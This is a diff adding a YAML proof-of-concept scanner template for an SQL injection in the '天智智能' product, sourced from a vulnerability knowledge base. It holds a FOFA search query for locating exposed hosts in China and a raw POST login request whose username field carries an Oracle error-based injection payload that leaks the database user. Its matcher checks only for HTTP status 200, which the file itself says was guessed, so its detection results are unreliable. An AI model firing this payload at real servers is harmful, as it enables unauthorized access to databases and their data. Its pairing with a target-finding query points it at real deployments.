@@ -1,0 +1,32 @@
+id: poc-kt6e876q9m5lco36
+info:
+  name: 天智智能Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kt6e876q9m5lco36
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kt6e876q9m5lco36
+    fofa: '"Ashx/Usermanager.ashx" && country="CN"'
+http:
+- raw:
+  - 'POST /Ashx/Usermanager.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    type=LOGIN&username=123'')+AND+3109%3DUTL_INADDR.GET_HOST_ADDRESS(''~''%7C%7C(user)%7C%7C''~'')+--&pwd=123&vendor='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
